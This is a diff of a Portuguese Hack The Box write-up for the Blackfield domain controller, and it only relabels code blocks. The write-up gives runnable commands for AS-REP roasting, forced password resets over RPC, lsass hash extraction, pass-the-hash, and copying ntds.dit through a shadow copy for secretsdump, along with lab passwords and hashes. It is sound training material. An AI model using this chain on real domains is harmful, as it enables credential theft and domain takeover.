@@ -188,7 +188,7 @@
 <h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
 <p>Como sempre, quando se enfrenta uma máquina, temos de saber por onde vamos entrar. Para isso, temos de enumerar todas as portas abertas da máquina. Iremos utilizar o clássico nmap para esta tarefa.</p>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
-<pre><code class="language-bash">sudo nmap -sS -p- -n -Pn --min-rate 5000 10.10.10.192 -oG enumeration/allPorts
+<pre><code class="language-powershell">sudo nmap -sS -p- -n -Pn --min-rate 5000 10.10.10.192 -oG enumeration/allPorts
 
 #&gt;  Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 #&gt;  Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 14:15 WEST
@@ -250,17 +250,17 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 <p>Pelas portas abertas, podemos concluir que estamos perante um Domain Controller. Não vemos páginas de internet, nem nenhum programa estranho a rodar, portanto parece que esta máquina só trata de problemas que nos podemos enfrentar em Active Directory / Domain Controller. Posto isso, o primeiro ponto que quero é enumerar usuários.</p>
 <h2 id="smb-anonymous"><a class="header" href="#smb-anonymous">SMB (anonymous)</a></h2>
 <p>Antes de tentar ver o que há nas partilhas, vamos tentar sempre conectar por RPC, visto que por esse protocolo é extremamente fácil enumerar todos os usuários, grupos e muito mais...</p>
-<pre><code class="language-bash">rpcclient 10.10.10.192 -U '' -N
+<pre><code class="language-powershell">rpcclient 10.10.10.192 -U '' -N
 </code></pre>
 <p>Não me é possível conectar... Vamos então tentar entrar por samba</p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.192
+<pre><code class="language-powershell">crackmapexec smb 10.10.10.192
 #&gt; SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 </code></pre>
 <p>Ok, já temos algumas informações. Temos o domínio (blackfield.local) e o nome da máquina (DC01). vamos adicionar essas informações para o nosso /etc/hosts, para possíveis futuras ferramentas usarem essa informação</p>
-<pre><code class="language-bash">echo -e &quot;10.10.10.192\tblackfield.local dc01.blackfield.local&quot; &gt;&gt; /etc/hosts
+<pre><code class="language-powershell">echo -e &quot;10.10.10.192\tblackfield.local dc01.blackfield.local&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <p>Com a ferramenta crackmapexec, temos opção para ver as pastas partilhadas com o parâmetro &quot;--shares&quot;</p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.192 --shares
+<pre><code class="language-powershell">crackmapexec smb 10.10.10.192 --shares
 
 #&gt;  SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 #&gt;  SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
@@ -268,7 +268,7 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 <p>Parece que não está acessível, mas o erro não é o normal desta ferramenta... diz &quot;STATUS*USER_SESSION_DELETED&quot;. Vamos tentar a mesma coisa especificandos login *&quot;null&quot;_ e password _&quot;vazio&quot;_</p>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/smb-null.png" alt="smb null session" /></p>
 <p>Agora sim! Vemos duas pastas partilhadas pelo qual podemos aceder. IPC$ e profiles$. IPC$ não tem nada, e profiles$ parece muito mais &quot;feito à unha&quot;. Vamos entrar e ver com smbclient, usando o null session</p>
-<pre><code class="language-bash">smbclient \\\\10.10.10.192\\profiles$ -U 'null'  # Pede a palavra pass. É só dar Enter...
+<pre><code class="language-powershell">smbclient \\\\10.10.10.192\\profiles$ -U 'null'  # Pede a palavra pass. É só dar Enter...
 
 smb: \&gt; dir
 #&gt;    .                                   D        0  Wed Jun  3 17:47:12 2020
@@ -280,12 +280,12 @@ smb: \&gt; dir
 #&gt;    ...
 </code></pre>
 <p>A resposta é enorme. Montes de pastas. E essas pastas soa como nomes de pessoas... Temos uns possíveis usuários. Vamos copiar isto tudo e filtrar para guardar apenas o nome da pasta para um ficheiro &quot;users&quot;</p>
-<pre><code class="language-bash">smbclient \\\\10.10.10.192\\profiles$ -U 'null' -N -c &quot;dir&quot; &gt; contents/users
+<pre><code class="language-powershell">smbclient \\\\10.10.10.192\\profiles$ -U 'null' -N -c &quot;dir&quot; &gt; contents/users
 cat contents/users | awk '{print$1}' | sponge contents/users
 </code></pre>
 <h2 id="as-rep-roasting-attack"><a class="header" href="#as-rep-roasting-attack">AS-REP Roasting Attack</a></h2>
 <p>Agora que temos todos esses usuários, vamos tentar fazer o clássico AS-REP Roasting Attack, para tentar receber um TGT de um usuário que não precisa de requerer a pre-autenticação kerberos. Para isso, nada mais simples que o programa da impacket GetNPUsers.py</p>
-<pre><code class="language-bash">GetNPUsers.py blackfield.local/ -no-pass -usersfile contents/users | grep -v &quot;Client not found in Kerberos database&quot;
+<pre><code class="language-powershell">GetNPUsers.py blackfield.local/ -no-pass -usersfile contents/users | grep -v &quot;Client not found in Kerberos database&quot;
 </code></pre>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/getnpusers.png" alt="GetNPUsers.py" /></p>
 <p>Temos um TGT! Esse TGT pode ser decifrado com john-the-ripper ou o hashcat.</p>
@@ -295,23 +295,23 @@ cat contents/users | awk '{print$1}' | sponge contents/users
 <p>support:#00^BlackKnight</p>
 </blockquote>
 <p>Vamos validar a credential com o crackmapexec</p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
+<pre><code class="language-powershell">crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
 </code></pre>
 <p>Está válido! Já ques estamos em SMB, vamos ver que ganhamos acesso a mais pastas partilhadas</p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
+<pre><code class="language-powershell">crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
 smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'
 </code></pre>
 <p>Vemos mais pastas. Mas não há nada de mais... Existe ainda uma pasta partilhada que não temos acesso. A pasta &quot;forensic&quot;. É promissor... mas o que fazer agora? Não podemos avançar por SMB... Pois se não podemos avançar por SMB, podemos voltar uma passo atrás e tentar conectar-nos ao serviço RPC com estas novas credenciais, que já foram validadas pelo crackmapexec. Ainda importante a referir, as credenciais não passaram no teste de validação por winrm...</p>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/smb-support.png" alt="Permissões SMB do usuário support" /></p>
 <h2 id="rpc"><a class="header" href="#rpc">RPC</a></h2>
 <p>Vamos então voltar ao primeiro passo. Enumeração via RPC, mas desta vez, com as credenciais do usuário &quot;support&quot;</p>
-<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot;
+<pre><code class="language-powershell">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot;
 </code></pre>
 <p>Bingo! Desta vez tenho resposta. E bem grande! Todos os usuários a nível de domínio!. Isso significa duas coisas. Significa que posso tentar um novo attack AS-RES Roasting, e significa que posso extrair todas as informações de domínio.</p>
-<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]'
+<pre><code class="language-powershell">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]'
 </code></pre>
 <p>Todos os usuários podem ser listados com este comando... mas para limpar um pouco os usuários desnecessários para a resolução da máquina, afim de termos outputs mais &quot;cleans&quot;, vou já eliminar todos os usuários BLACKFIELD*.</p>
-<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]' | grep -v &quot;BLACKFIELD&quot;
+<pre><code class="language-powershell">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]' | grep -v &quot;BLACKFIELD&quot;
 
 #&gt;  Administrator
 #&gt;  Guest
@@ -325,7 +325,7 @@ rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; 
 </code></pre>
 <h2 id="as-rep-roasting-attack-1"><a class="header" href="#as-rep-roasting-attack-1">AS-REP Roasting Attack</a></h2>
 <p>O novo ataque AS-RES Roasting naõ revela mais nada, apenas mostra outro TGT (porque a data/hora/min/seg é usado para gerar cada TGT) do mesmo usuário &quot;support&quot;, mas confirma que todos os outros usuários existem.</p>
-<pre><code class="language-bash">GetNPUsers.py blackfield.local/ -no-pass -usersfile contents/users
+<pre><code class="language-powershell">GetNPUsers.py blackfield.local/ -no-pass -usersfile contents/users
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
@@ -339,7 +339,7 @@ Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 </code></pre>
 <h2 id="bloodhound"><a class="header" href="#bloodhound">Bloodhound</a></h2>
 <p>Agora que temos acesso ao RPC, e que podemos extrair todas informações públicas a nível de domínio, podemos tratar de gerar uma base de dados para a nossa ferramenta bloodhound, que já usamos em outras máquinas.</p>
-<pre><code class="language-bash">bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
+<pre><code class="language-powershell">bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
 
 sudo neo4j start
 bloodhound &amp;&gt;/dev/null &amp;
@@ -349,18 +349,18 @@ disown
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/Animation.webp" alt="Video Bloodhound" /></p>
 <p>Com a ajuda do BloodHound, vemos que o usuário support tem privilégio &quot;ForceChangePassword&quot; sobre o usuário Audit2020. Isso quer dizer que, podemos alterar a password de Audit2020 sem precisar saber a password actual dele.</p>
 <p>Existem muitas maneiras de se fazer isso localmente, mas a partir de fora, sem RCE, apenas podemos mudar a password por RPC, e validar as novas credenciais...</p>
-<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c 'setuserinfo2 Audit2020 23 J4v4li123!'
+<pre><code class="language-powershell">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c 'setuserinfo2 Audit2020 23 J4v4li123!'
 crackmapexec smb 10.10.10.192 -u 'Audit2020' -p 'J4v4li123!'
 </code></pre>
 <h2 id="smb"><a class="header" href="#smb">SMB</a></h2>
 <p>Conseguimos alterar a password com sucesso! O nome do usuário Audit2020 é suspeito de ter qualquer coisa a ver com uma das pastas partilhadas que vimos, a forensic! Vamos verificar se temos acesso</p>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/crackmapexec-audit2020.png" alt="Crackmapexec smb Audit" /></p>
-<pre><code class="language-bash">smbclient \\\\10.10.10.192\\forensic -U 'Audit2020%J4v4li123!'
+<pre><code class="language-powershell">smbclient \\\\10.10.10.192\\forensic -U 'Audit2020%J4v4li123!'
 smb: \&gt; recurse ON
 smb: \&gt; dir
 </code></pre>
 <p>Existem muitas pastas e ficheiros! É impensável descarregar tudo para a nossa máquina. Mas para ser mais fácil percorrer e visualizar a pasta partilhada, é melhor montar esta unidade na nossa própria máquina</p>
-<pre><code class="language-bash">sudo su
+<pre><code class="language-powershell">sudo su
 cd /mnt
 mkdir smb
 mount -t cifs //10.10.10.192/forensic /mnt/smb -o username=Audit2020,password=J4v4li123\!,domain=blackfield.local,rw
@@ -370,7 +370,7 @@ cd smb
 <p>A partir de agora estamos sincronizados com a pasta de partilha. Atenção que, por mais que todos os ficheiros estão referenciados como sendo proprietário root, isto não corresponde à verdade. É mais ou menos um link, e um link no linux tem proprietário e privilégios do seu criador, não do objeto linkado.</p>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/mount_forensic.png" alt="SMB Mounted - forensic" /></p>
 <p>Vemos que existe 718 ficheiros espalhados por 38 diretórios... Mas a pasta memory_analysis é muito acolhedor. E lá dentro está um ficheiro lsass.zip. Se dentro desse zip se encontra um minidump de lsass.DMP, isto está maravilhosamente fácil. Para extrair hashes de todos os usuários locais, basta utilizar a ferramenta pypykatz. O resultado do comando é longo, então podemos filtrar por &quot;NT&quot; e &quot;Username&quot;, fazer um &quot;sort&quot; disse tudo, separar os usuários dos hashes, e dar os ingredientes todos para o crackmapexec identificar que hash é de que usuários, e validar logo isto tudo</p>
-<pre><code class="language-bash">cd memory_analysis
+<pre><code class="language-powershell">cd memory_analysis
 cp lsass.zip /home/javali/CaptureTheFlag/HackTheBox/contents
 cd /home/javali/CaptureTheFlag/HackTheBox/contents
 unzip lsass.zip
@@ -389,7 +389,7 @@ cat lsass.out | grep -E &quot;NT|Username&quot; | sort -u
 #&gt;                  Username: svc_backup
 </code></pre>
 <p>Temos 3 hashes e 2 usuários (o DC01$ não é um usuários... é a máquina.)</p>
-<pre><code class="language-bash">echo -e &quot;7f1e4ff8c6a8e6b6fcae2d9c0572cd62\n9658d1d1dcd9250115e2205d9f48400d\nb624dc83a27cc29da11d9bf25efea796&quot; &gt; tmp_hashes
+<pre><code class="language-powershell">echo -e &quot;7f1e4ff8c6a8e6b6fcae2d9c0572cd62\n9658d1d1dcd9250115e2205d9f48400d\nb624dc83a27cc29da11d9bf25efea796&quot; &gt; tmp_hashes
 echo -e &quot;Administrator\nsvc_backup&quot; &gt; tmp_users
 
 crackmapexec smb 10.10.10.192 -u tmp_users -H tmp_hashes --continue-on-success
@@ -417,32 +417,32 @@ expose %privesc% z:
 <ul>
 <li>Ajustar compatibilidade do ficheiro para windows</li>
 </ul>
-<pre><code class="language-bash">unix2dos privesc.txt
+<pre><code class="language-powershell">unix2dos privesc.txt
 </code></pre>
 <ul>
 <li>Transferir privesc.txt para o windows. Via evil-winrm, é facílimo. Privilegie um directório sem nenhum tipo de restrições de escrita (AppLockerBypass)</li>
 </ul>
-<pre><code class="language-bash">cd C:\Windows\System32\spool\drivers\color
+<pre><code class="language-powershell">cd C:\Windows\System32\spool\drivers\color
 upload /home/javali/CaptureTheFlag/HackTheBox/contents/privesc.txt
 </code></pre>
 <ul>
 <li>Criar uma cópia shadow da unidade C:\ com as configurações do ficheiro privesc.txt</li>
 </ul>
-<pre><code class="language-bash">diskshadow.exe /s .\privesc.txt
+<pre><code class="language-powershell">diskshadow.exe /s .\privesc.txt
 </code></pre>
 <ul>
 <li>Copiar o shadow de ntds.dit para um local acessível no C:</li>
 </ul>
-<pre><code class="language-bash">robocopy /b Z:\Windows\NTDS C:\Windows\System32\spool\drivers\color ntds.dit
+<pre><code class="language-powershell">robocopy /b Z:\Windows\NTDS C:\Windows\System32\spool\drivers\color ntds.dit
 </code></pre>
 <p>Agora temos a tal base de dados de todo o Domian Controller. Para poder ser lido, ainda faltam umas chaves de criptografia que se encontram em HKLM\SYSTEM. Basta gravar a propria memória RAM deste ficheiro em uso para o mesmo local da cópia do ntds.dit (para depois recuperar ambos os ficherio para a nossa máquina, com o commando download do evil-winrm)</p>
-<pre><code class="language-bash">reg save HKLM\system system
+<pre><code class="language-powershell">reg save HKLM\system system
 
 download &quot;C:/Windows/System32/spool/drivers/color/system&quot;
 download &quot;C:/Windows/System32/spool/drivers/color/ntds.dit&quot;
 </code></pre>
 <p>Com esse 2 ficheiros, é possível extrair todos os hashes NT dos usuário de domínio</p>
-<pre><code class="language-bash">secretsdump.py -ntds ntds.dit -system system LOCAL &gt; users_domain_hashes
+<pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system LOCAL &gt; users_domain_hashes
 cat users_domain_hashes | grep &quot;Administrator&quot;
 #&gt;  Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
 </code></pre>
